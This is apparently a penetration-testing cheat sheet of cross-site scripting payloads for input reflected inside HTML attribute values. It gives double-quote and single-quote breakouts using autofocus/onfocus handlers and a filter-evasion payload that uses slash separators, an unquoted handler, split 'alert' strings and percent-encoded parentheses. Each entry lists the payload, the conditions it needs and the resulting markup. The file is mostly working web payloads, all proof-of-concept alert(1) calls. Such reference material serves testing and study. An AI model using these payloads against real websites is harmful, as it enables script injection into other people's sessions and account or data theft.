1. XSS inside an Attribute Value inside a Tag (Double Quote)
- Payload: " autofocus onfocus="alert(1)
- Condition: Input is reflected inside an attribute value within an HTML tag where angle brackets (< >) are encoded
- Case: Angle brackets are encoded but double quotes are not filtered, allowing breakout from the attribute. This payload only works in HTML attribute contexts (e.g. value="...") — it does NOT work inside a <script> tag because autofocus/onfocus are HTML event attributes, not JavaScript syntax
- Output: <input type="text" value="" autofocus onfocus="alert(1)">

---

2. XSS inside an Attribute Value inside a Tag (Single Quote)
- Payload: ' autofocus onfocus='alert(1)
- Condition: Input is reflected inside an attribute value within an HTML tag where angle brackets (< >) are encoded
- Case: Angle brackets are encoded but single quotes are not filtered, allowing breakout from the attribute. This payload only works in HTML attribute contexts (e.g. value='...') — it does NOT work inside a <script> tag because autofocus/onfocus are HTML event attributes, not JavaScript syntax
- Output: <input type="text" value='' autofocus onfocus='alert(1)'>

---

3. XSS inside an Attribute Value (Unquoted Handler, Space Stripped)
- Payload: "/autofocus/onfocus=location="javascript:al"+"ert%281%29"//
- Condition: Input is reflected inside a double-quoted attribute value where angle brackets (< >) are encoded, double quotes (") pass raw, spaces are stripped, and the handler body needs to contain " itself (e.g. location="javascript:..." — a quoted onfocus="..." wrapper would be terminated early by the inner quote)
- Case: Three combined techniques: (a) / replaces the stripped space as the attribute separator, (b) the onfocus value is left UNQUOTED — HTML5 keeps literal " inside unquoted attribute values (parse error, but retained), so the handler can embed "javascript:..." strings, (c) // line-comments the server's own closing quote so trailing markup does not cause a JS syntax error. alert is also concat-masked ("al"+"ert") and () are percent-encoded (%28%29) for filters that strip those tokens — see 'xss without parentheses.md' #6-#7
- Output: <input type="text" value=""/autofocus/onfocus=location="javascript:al"+"ert%281%29"//">
